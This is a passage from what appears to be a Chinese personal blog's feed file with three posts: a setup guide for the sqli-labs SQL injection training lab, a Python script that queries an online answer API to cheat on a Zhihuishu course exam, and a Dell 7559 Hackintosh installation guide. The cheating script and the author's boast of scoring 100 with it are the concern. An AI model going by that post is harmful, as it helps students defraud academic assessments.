alt></p><p>编辑<code>sql-connections/db-creds.inc</code>文件，添加Mysql密码, 我这里设置成为<code>root</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.qtzh4ztrf7r_1534071191.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.nfdl7jzf3uj_1534071200.png" alt></p><p>并且在phpstudy中修改MYSQL的密码为一致（默认密码为<code>root</code>）</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.p8abdukyfkh_1534071211.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.yrae1htj1s_1534071218.png" alt></p><p>打开网址<code>http://localhost/sqli-labs/</code>访问<code>Setup/resetDatabase for labs</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.fw07042j06k_1534071230.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.mo2c6g9a21_1534071236.png" alt></p><p>安装完成之后就可以开始学习之旅了！</p><h2 id="docker可视化版"><a href="#docker可视化版" class="headerlink" title="docker可视化版"></a>docker可视化版</h2><blockquote><p>对于linux和mac下, 本人极力推荐使用<code>docker</code>, 因为其本身环境配置过于麻烦, 所以这里只讨论docker的安装与配置~~</p></blockquote><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ol><li><p>增加Docker pgp key</p><pre><code> apt update apt install -y apt-transport-https ca-certificates curl software-properties-common curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</code></pre></li><li><p>添加docker-ce的apt 源</p><pre><code> echo &#39;deb https://download.docker.com/linux/debian stretch stable&#39; &gt; /etc/apt/sources.list.d/docker.list apt update</code></pre></li><li><p>删除原系统docker</p><pre><code> apt purge docker docker-engine docker.io</code></pre></li><li><p>安装docker</p><pre><code> apt install docker-ce</code></pre></li><li><p>验证是否安装成功</p><pre><code> docker run hello-world</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522124652.png" alt></p></li><li><p>接下来安装<code>kitematic</code>, 去 <a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">https://github.com/docker/kitematic/releases</a> 下载Ubuntu版本的</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522124704.png" alt></p><p> 然后解压, 安装</p><pre><code> unzip Kitematic-0.17.7-Ubuntu cd Kitematic-0.17.7-Ubuntu/ dpkg -i Kitematic-0.17.7_amd64.deb apt install -f</code></pre></li><li><p>然后打开<code>kitematic</code>, 输入账号密码登录一波, 然后搜索<code>sqli-labs</code>, 找到<code>acgpiano</code>, 点击<code>CREATE</code>即可</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522124726.png" alt></p></li><li><p>接下来就是打开sqli-lab了, 直接点<code>WEB PPREVIEW</code>右边那个按钮</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522124750.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522124812.png" alt></p></li><li><p>然后就是点击<code>Setup/reset Database for labs</code>, 初始化数据库, 操作与windows相同.</p></li></ol><h3 id="mac下"><a href="#mac下" class="headerlink" title="mac下"></a>mac下</h3><h4 id="白果或者intel黑苹果"><a href="#白果或者intel黑苹果" class="headerlink" title="白果或者intel黑苹果"></a>白果或者intel黑苹果</h4><blockquote><p>mac下的安装就非常简单了</p></blockquote><ol><li>下载安装<a href="https://hub.docker.com/editions/community/docker-ce-desktop-mac" target="_blank" rel="noopener">docker</a></li><li>下载安装<a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">kitematic</a></li><li>接下来就是打开kitematic, 操作步骤同上</li></ol><h4 id="amd黑苹果"><a href="#amd黑苹果" class="headerlink" title="amd黑苹果"></a>amd黑苹果</h4><blockquote><p>好吧, 本人是个穷人, 没钱用白果, 所以只能靠hackintosh过日子了, 因为是amd黑苹果, 所以安装步骤略微复杂一些</p></blockquote><p>amd 的docker无法正常工作, 解决链接: <a href="https://forum.amd-osx.com/viewtopic.php?f=24&t=3543&p=45524&hilit=docker#p45524" target="_blank" rel="noopener">https://forum.amd-osx.com/viewtopic.php?f=24&amp;t=3543&amp;p=45524&amp;hilit=docker#p45524</a></p><ol><li>下载安装virtualbox, 并打开, 确保其可以正常工作</li><li>下载安装<code>Docker Toolbox for mac</code>, <a href="https://github.com/docker/toolbox/releases" target="_blank" rel="noopener">https://github.com/docker/toolbox/releases</a></li><li>下载安装<code>docker</code></li><li>打开终端</li></ol><pre><code>docker-machine create -d &quot;virtualbox&quot; --virtualbox-no-vtx-check --engine-install-url https://github.com/boot2docker/boot2docker/releases/download/v18.09.3/boot2docker.iso default</code></pre><ol start="5"><li>打开<a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">kitematic</a>, 接下来的步骤同上</li></ol><h2 id="docker命令行版"><a href="#docker命令行版" class="headerlink" title="docker命令行版"></a>docker命令行版</h2><blockquote><p>如果你发现你安装的kitematic无法正常工作, 那没办法, 只能用命令行了</p></blockquote><ol><li><p>拉取<code>sqli-labs</code>镜像</p><pre><code> docker pull acgpiano/sqli-labs</code></pre></li><li><p>运行该镜像</p><pre><code> docker run -dt --name SQLI-LABS -p 80 --rm  acgpiano/sqli-labs #run 创建一个新的容器并运行一个命令 #-d 表示后台运行,返回容器id #-t  为容器重新分配一个伪输入终端，通常与 -i 同时使用 #--name SQLI-LABS 将容器命名为SQLI-LABS #-p 80  将acgpiano/sqli-labs的80端口映射到本地的PORT端口</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538711152" alt></p><p> 访问<code>localhost:32769</code>就可以看到效果了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538711194" alt></p></li><li><p>进入docker镜像终端</p><pre><code> docker ps    # 查看正在运行的容器 docker ps -a # 查看所有容器 docker exec -it ID /bin/bash #exec 在运行的容器中执行命令 #-t 分配一个伪终端 #-i 即使没有附加也保持STDIN 打开(不懂)</code></pre></li><li><p>docker常用命令</p><pre><code> docker images                 # 列出本地镜像 docker start CONTAINER        # 启动一个或多少已经被停止的容器 docker stop CONTAINER         # 停止一个运行中的容器 docker restart CONTAINER      # 重启容器 docker rm CONTAINER           # 删除容器 docker rmi IMAGE              # 删除镜像 sudo systemctl daemon-reload  # reload daemon.json sudo systemctl restart docker # 重启docker</code></pre></li></ol><h2 id="给sqli-lab安装vim"><a href="#给sqli-lab安装vim" class="headerlink" title="给sqli-lab安装vim"></a>给sqli-lab安装vim</h2><p>为了方便修改文件, 所以我们需要安装vim, 但是官方源已经挂了, 所以, 我们需要添加<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">清华源</a></p><p><code>vi</code>修改<code>/etc/apt/sources.list</code>如下</p><pre><code>vi /etc/apt/sources.list</code></pre><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse</code></pre><p>然后需要解决https的问题</p><pre><code>cd /usr/lib/apt/methodsln -s http httpsapt-get updateapt-get install apt-transport-https</code></pre><p>最后安装vim即可</p><pre><code>apt install vim</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> sqli-lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-lab环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智慧树网课考试</title>
      <link href="/2019/05/15/zhi-hui-shu-wang-ke-kao-shi/"/>
      <url>/2019/05/15/zhi-hui-shu-wang-ke-kao-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前两天博主网络通识课要期末考试啦, 不想百度谷歌, 于是找了一波接口, 还真被我发现有大佬已经写好接口了, 不说话, 上py</p></blockquote><a id="more"></a><pre class=" language-python3"><code class="language-python3">#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date    : 2019-05-13 14:55:01# @Link    : https://www.fengwenhua.topimport requestsfrom urllib.parse import urlencodefrom random import choicefrom requests.exceptions import ConnectionError, ReadTimeoutdef get_answer(question):    User_Agents_List = [        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0',        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',        'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11',        'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',    ]    headers = {        'User-Agent': choice(User_Agents_List),        'Accept-Encoding': 'gzip, deflate, sdch',        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'    }    params = {        'w': question,    }    url = "http://api.fm210.cn/wangke/cx.php?" + urlencode(params)    try:        r = requests.get(url, headers=headers, timeout=5)        if r.status_code == 200:            return r.text    except ConnectionError:        print('访问失败', url)    except ReadTimeout:        print('访问超时', url)if __name__ == '__main__':    # 将问题粘贴到这里, 然后直接运行即可    question = "3200K—5500K范围的色温，都适用于灯光彩色胶片的拍摄。"    print(get_answer(question))</code></pre><blockquote><p>由于本人用st3运行, 没有装可以输入的插件, 因此只能粘贴一下运行一下喽<del>~</del><br>最后, 靠着这个代码, 本人在智慧树中那门摄影基础期末考了100分!!!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
          <category> 生活技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智慧树答案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dell 7559 10 14 4 黑苹果</title>
      <link href="/2019/04/29/dell-7559-10-14-4-hei-ping-guo/"/>
      <url>/2019/04/29/dell-7559-10-14-4-hei-ping-guo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接: <a href="http://bbs.pcbeta.com/viewthread-1794485-1-1.html" target="_blank" rel="noopener">Dell 7559 安装10.14GM教程（i5+UEFI）</a></p></blockquote><blockquote><p>安装10.14.3链接: <a href="https://fengwenhua.top/2019/02/14/dell-7559-10-14-3-黑苹果/" target="_blank" rel="noopener">Dell-7559-10.14.3</a></p></blockquote><ul><li>最近出了10.14.4, 忍不住升级了一波,结果黑屏….好吧,一怒之下,直接重装,就是这么霸气!</li><li>好吧,废话少说,先看看效果然后再决定往下看</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171111.png" alt></p><a id="more"></a><ol><li><p>声卡完美,耳机自动切换,笔记本快捷键,<code>F1</code>静音,<code>F2</code>调低声音和<code>F3</code>调高声音</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171125.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211546.png" alt></p></li><li><p>背光可调,也就是所谓的小太阳,笔记本快捷键<code>Fn+F1</code>和<code>Fn+F2</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211525.png" alt></p></li><li><p>USB3.0驱动成功</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171135.png" alt></p></li><li><p>蓝牙可用,可关闭打开</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171149.png" alt></p></li><li><p>睡眠可用,电量正常显示</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171224.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211908.png" alt></p></li><li><p>摄像头可用,使用mac自带的<code>Photo Booth</code>检测</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171234.png" alt></p></li><li><p>独显已经屏蔽</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171243.png" alt></p></li><li><p>可变频,测试软件<a href="https://software.intel.com/en-us/articles/intel-power-gadget-20" target="_blank" rel="noopener">Intel Power Gadget</a>和<a href="http://bbs.pcbeta.com/viewthread-1698338-1-1.html" target="_blank" rel="noopener">cpu-s</a>,这两个软件我已经下载好放在附件中了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171253.png" alt></p></li></ol><h2 id="0x00-电脑配置"><a href="#0x00-电脑配置" class="headerlink" title="0x00 电脑配置"></a>0x00 电脑配置</h2><ul><li>CPU: i7-6700HQ</li><li>内存: DDR3L 1600MHz *2</li><li>硬盘: 128G+1T</li><li>显卡: GTX960M 4G + Intel HD Graphics 530</li><li>声卡: ALC256</li><li>BIOS版本:1.2.8</li></ul><h2 id="0x01-BIOS准备"><a href="#0x01-BIOS准备" class="headerlink" title="0x01 BIOS准备"></a>0x01 BIOS准备</h2><ol><li><p>如果cpu是i5的,则需要去官网下载1.0.1的BIOS版本刷入,我是i7,所以不用管</p></li><li><p>更改BIOS设置如下</p><pre><code>  - 恢复BIOS默认设置  - AHCI mode 选择 SATA  - 关闭 VT for direct I/O  - 关闭 Advanced Battery Charging  - 关闭 Secure boot  - 关闭 SupportAssist System Resolution  - 关闭 Firmware TPM</code></pre></li></ol><h2 id="0x02-系统安装"><a href="#0x02-系统安装" class="headerlink" title="0x02 系统安装"></a>0x02 系统安装</h2><ol><li><p>下载macOS Mojave镜像: <a href="https://blog.daliansky.net/macOS-Mojave-10.14.4-18E226-official-version-with-Clover-4903-original-image.html" target="_blank" rel="noopener">黑果小兵】macOS Mojave 10.14.4 18E226 正式版 with Clover 4903原版镜像</a></p></li><li><p>检查下载的系统的md5是否是下载链接处提供的<code>ee923768b29194efc704bcf34d7f9fd8</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171306.png" alt></p><ul><li><p>windows下,使用<code>certutil</code>命令</p><pre><code>certutil -hashfile 系统镜像 MD5</code></pre></li><li><p>mac下使用<code>md5</code></p><pre><code>md5 系统镜像</code></pre></li></ul></li></ol><ol start="3"><li><p>如果在windows下,则使用<code>transmac</code>将镜像写入U盘,如果在mac上,则使用<code>balenaEtcher</code>将镜像写入U盘</p><ul><li><p>使用<code>transmac</code>将镜像写入U盘:先选择<code>Format Disk for Mac</code>格式化为Mac格式,然后选择<code>Restore with Disk Image</code>将镜像写入U盘</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128202859.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128203110.png" alt></p></li><li><p>使用<code>balenaEtcher</code>将镜像写入U盘:傻瓜式操作,选择下载的系统镜像,选择U盘,然后点击<code>Flash</code>,等待即可</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128203143.png" alt></p></li></ul></li><li><p>在windows下,使用<code>Diskgenius</code>,mac下使用<code>Clover Configurator</code>挂载U盘的EFI分区,我们需要修改一下<code>config.plist</code>,将原来默认的<code>config.plist</code>重命名成<code>config_bak.plist</code>,然后找到有<code>530</code>字眼的config文件,将其重命名为<code>config.plist</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171319.png" alt></p><blockquote><p>ps:如果你的配置以及Bios版本和我的一致,先删除U盘中的<code>CLOVERE</code>,然后你可以直接将附件中的<code>最终的CLOVER</code>重命名成<code>CLOVER</code>,然后放到U盘的EFI分区里面,当然,不能保证可以进入系统!最好还是跟我教程,自己一步步安装!</p></blockquote></li><li><p>然后可以拿着这个U盘启动盘去装系统了,具体的<strong>如何安装系统以及将启动U盘的CLOVER放在本地的EFI下</strong>的步骤这里略过,如果上面的操作正常,安装完成后是可以进入到mac系统的</p></li></ol><h2 id="0x03-驱动安装"><a href="#0x03-驱动安装" class="headerlink" title="0x03 驱动安装"></a>0x03 驱动安装</h2><ol><li><p><code>Clover Configurator</code>挂载本地<code>EFI</code>,进入<code>/EFI/CLOVER/kexts/Other</code>,移除多余的驱动,以及增加一些必备的驱动.</p><p> 原来的如下:</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171331.png" alt></p><p> 修改后如下:  下面增加的驱动,都可以在下面<code>Backup</code>文件夹找到, 如果找不到,就去<code>最终的clover</code>那里找</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171341.png" alt></p></li><li><p>让<code>Other</code>下的驱动可以生效, 打开<code>/EFI/CLOVER/config.plist</code>,在<code>System Parameters-&gt;Inject Kexts</code>改成<code>Yes</code>,然后保存</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171350.png" alt></p></li><li><p>移除键鼠标驱动, 防止与<code>Other</code>下的鼠标驱动<code>ApplePS2SmartTouchPad.kext</code>冲突, 终端输入：</p><pre><code> sudo rm -rf /System/Library/Extensions/AppleACPIPS2Nub.kext</code></pre></li><li><p>安装<code>Clover_v2.4k_r4901.pkg</code>,这个很重要,需要自定义安装<code>RC Scripts</code>,不然可能无法保存背光</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171402.png" alt></p></li><li><p>重启准备进行<code>dsdt</code>和<code>ssdt</code>制作</p></li></ol><h2 id="0x04-DSDT和SSDT文件制作"><a href="#0x04-DSDT和SSDT文件制作" class="headerlink" title="0x04 DSDT和SSDT文件制作"></a>0x04 DSDT和SSDT文件制作</h2><blockquote><p>如果你对BIOS版本和我的一样,那么直接用我<code>CLOVER/ACPI/patched</code>文件夹里面的文件即可,也就是说不用看这节的内容了.需要说明的是,一般来说,不同BIOS版本的文件不能通用，容易出错, 从而进不去系统</p></blockquote><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><ol><li><p>开机选择Mac图标,按下<code>F4</code>，所需文件会自动出现在<code>EFI/Clover/ACPI/origin</code>文件夹</p></li><li><p>使用<code>Clover Configurator</code>加载引导分区EFI,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220355.png" alt></p></li><li><p>将<code>EFI/Clover/ACPI/</code>下的<code>origin</code>文件夹复制到桌面</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171447.png" alt></p></li><li><p>复制附件中的<code>iasl</code>和<code>refs</code>文件至桌面的<code>origin</code>文件夹</p></li><li><p>终端输入:</p><pre><code> cd ~/Desktop/origin sudo cp iasl /usr/bin iasl -da -dl -fe refs.txt DSDT.aml SSDT*.aml</code></pre><p> 将会有<code>****.dsl</code>文件创建于<code>origin</code>文件夹,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171500.png" alt></p></li></ol><h4 id="DSDT文件制作"><a href="#DSDT文件制作" class="headerlink" title="DSDT文件制作"></a>DSDT文件制作</h4><blockquote><p>注意每改一下,都要<code>Compile</code>一下,查看是否有error,修复它,不管warning</p></blockquote><ol><li><p>使用<code>MaciASL.app</code>打开<code>DSDT.dsl</code>文件</p></li><li><p>点击<code>Compile</code>,出现4个error,都是<code>PARSEOP_EXP_MULTIPLY</code>错误,双击跳转到error位置,删掉这四行即可,如果遇到其他错误自行百度</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220439.png" alt></p></li><li><p>查找<code>HECI</code> 用<code>IMEI</code>替代;查找<code>HDAS</code> 用<code>HDEF</code>替代,</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220532.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220541.png" alt></p><p> 然后再<code>Compile</code>一下,不用管<code>Warnings</code>,没有<code>Errors</code>即可</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220603.png" alt></p></li><li><p>点击<code>Patch</code>,在<code>RehabMan Laptop</code>下,查找到以下项目，单击后按<code>Apply</code></p><pre><code> -[syn] Rename _DSM methods to XDSM -[Audio] Audio Layout 3 -[bat] Dell Inspiron 15-7xxx -[sys] Fix _WAK Arg0 v2  -[sys] Fix Mutex with non-zero SyncLevel -[sys] HPET Fix -[sys] IRQ fix -[sys] RTC Fix -[sys] Skylake LPC -[sys] SMBUS Fix -[usb] USB3_PRW 0x6D Skylake (instant wake)</code></pre><ul><li><p>下面以<code>[syn] Rename _DSM methods to XDSM</code>为例,点击<code>Patch</code>,选择<code>_RehabMan Laptop</code>(这个名字是自己取的,只要Patch源是  <a href="http://raw.github.com/RehabMan/Laptop-DSDT-Patch/master" target="_blank" rel="noopener">http://raw.github.com/RehabMan/Laptop-DSDT-Patch/master</a> 即可)</p><blockquote><p>我放在附件中的<code>MaciASL</code>是最新版本的,已经包含了<code>RehabMan Laptop</code>的源,如下图.如果你发现点击<code>Patch</code>之后<strong>显示空白</strong>,则说明网络不好,要么等一会,要么科学上网.</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128185836.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220635.png" alt></p></li><li><p>选择<code>[syn] Rename _DSM methods to XDSM</code>之后,等一会,然后点击<code>Apply</code>,然后再等一会,指导右边上下两个框框都没有东西了,说明替换成功</p><blockquote><p>ps:这里多说一句,如果你是程序员的话,应该明白,这个本质就是通过正则匹配,然后替换成指定内容而已,当然这个具体为什么替换成这些内容,只有问RehabMan大佬了</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220653.png" alt></p></li></ul></li><li><p>查找<code>layout</code>，并将<code>3</code>替换为<code>13</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220704.png" alt></p></li><li><p>点击<code>Compile</code>,不管Warnings,有error就修复</p></li><li><p>接下来屏蔽独显： 开头处添加</p><pre><code> External (_SB_.PCI0.PEG0.PEGP._PS3, MethodObj) External (_SB_.PCI0.PEG0.PEGP._PS0, MethodObj) External (_SB_.PCI0.PEG0.PEGP._OFF, MethodObj) External (_SB_.PCI0.PEG0.PEGP._ON, MethodObj) External (_SB_.PCI0.PEG0.PEGP.SGOF, MethodObj) External (_SB_.PCI0.PEG0.PEGP.SGON, MethodObj)</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220725.png" alt></p><p> 搜索<code>_WAK</code>，并在其之前添加</p><pre><code> Method (M_ON, 0, NotSerialized)     {         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._ON))         {             \_SB_.PCI0.PEG0.PEGP._ON()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._PS0))         {             \_SB_.PCI0.PEG0.PEGP._PS0()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP.SGON))         {             \_SB_.PCI0.PEG0.PEGP.SGON()         }     } Method (M_OF, 0, NotSerialized)     {         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._OFF))         {             \_SB_.PCI0.PEG0.PEGP._OFF()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP._PS3))         {             \_SB_.PCI0.PEG0.PEGP._PS3()         }         If (CondRefOf (\_SB_.PCI0.PEG0.PEGP.SGOF))         {             \_SB_.PCI0.PEG0.PEGP.SGOF()         }     }</code></pre><p> 如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220755.png" alt></p><p> 搜索<code>_WAK</code>，添加<code>M_OF()</code>,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220811.png" alt></p><p> 搜索<code>_PTS</code>，添加<code>M_ON()</code>,如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220833.png" alt></p><p> 搜索<code>Method (_INI, 0, Serialized)</code>，并在图示位置添加<code>M_OF()</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220845.png" alt></p></li><li><p>点击<code>Compile</code>，检查有无错误，无错误则选择<code>File</code>-&gt;<code>Save as...</code>-&gt;<code>ACPI Machine Language Binary</code>格式保存至桌面，有错误则从头再来</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171516.png" alt></p></li><li><p>拷贝制作的<code>DSDT.aml</code>文件至引导分区<code>EFI/Clover/ACPI/patched</code></p></li></ol><h4 id="SSDT-5-aml制作"><a href="#SSDT-5-aml制作" class="headerlink" title="SSDT-5.aml制作"></a>SSDT-5.aml制作</h4><ol><li><p>打开<code>SSDT-5.dsl</code>，先点<code>Compile</code>,没有error之后,再点击<code>patch</code>，选择<code>[igpu] Rename GFX0 to IGPU</code>  然后点击<code>Apply</code>,同理另存为<code>ACPI Machine Language Binary</code>格式保存至<strong>桌面,</strong>如下两个图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171523.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127220918.png" alt></p></li><li><p>拷贝制作的<code>SSDT-5.aml</code>文件和附件中<code>SSDT-PNLF.aml</code>、<code>SSDT-UIAC.aml</code>至引导分区<code>EFI/Clover/ACPI/patched</code></p></li></ol><h4 id="制作SSDT-aml"><a href="#制作SSDT-aml" class="headerlink" title="制作SSDT.aml"></a>制作SSDT.aml</h4><ul><li>打开终端,输入下方两条指令</li></ul><pre><code>curl -o ssdtPRGen.sh https://raw.githubusercontent.com/Piker-Alpha/ssdtPRGen.sh/Beta/ssdtPRGen.shchmod +x ssdtPRGen.sh</code></pre><ul><li>如果是i7 6700HQ使用</li></ul><pre><code>./ssdtPRGen.sh -p &#39;i7-6700HQ&#39; -f 2600 -turbo 3500</code></pre><ul><li>如果是i5 6300HQ使用</li></ul><pre><code>./ssdtPRGen.sh -p &#39;i5-6300HQ&#39; -f 2300 -turbo 3200</code></pre><p>根据提示选择<code>y</code>、<code>n</code></p><pre><code>cp /Users/用户名/Library/ssdtPRGen/ssdt.aml /Users/用户名/Desktop/SSDT.aml</code></pre><p>同理把<code>SSDT.aml</code>拷贝至引导分区<code>EFI/Clover/ACPI/patched</code> 至此你的<code>patched</code>文件夹应包含以下内容</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190330171537.png" alt></p><p>然后重启即可</p><h2 id="0x05-蓝牙不可关闭修复"><a href="#0x05-蓝牙不可关闭修复" class="headerlink" title="0x05 蓝牙不可关闭修复"></a>0x05 蓝牙不可关闭修复</h2><blockquote><p>总结起来就是,根据供应商ID,找到产品ID,然后正确修改产品ID</p></blockquote><ol><li><p><code>关于本机</code>-&gt;<code>系统报告</code>-&gt;找到蓝牙的供应商ID和产品ID</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190127155708.png" alt></p><pre><code> 供应商 ID：   0x8087 产品 ID：    0x0A2A</code></pre></li><li><p>转换为10进制</p><pre><code> 供应商 ID：    32903 产　品 ID：    2602</code></pre></li><li><p>编辑<code>/System/Library/Extensions/IOBluetoothFamily.kext/Contents/PlugIns/BroadcomBluetoothHostControllerUSBTransport.kext/Contents/Info.plist</code>文件，搜索 <code>IOKitPersonalities</code>,然后修改<code>idVendor</code>值为<code>32903</code>和<code>idProduct</code>的值为<code>2602</code>如下：<br> 原来的如下</p><pre class=" language-xml"><code class="language-xml">     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOKitPersonalities<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>Broadcom2045FamilyUSBBluetoothHCIController_D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dict</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>CFBundleIdentifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>com.apple.iokit.BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>IOClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>BroadcomBluetoothHostControllerUSBTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token 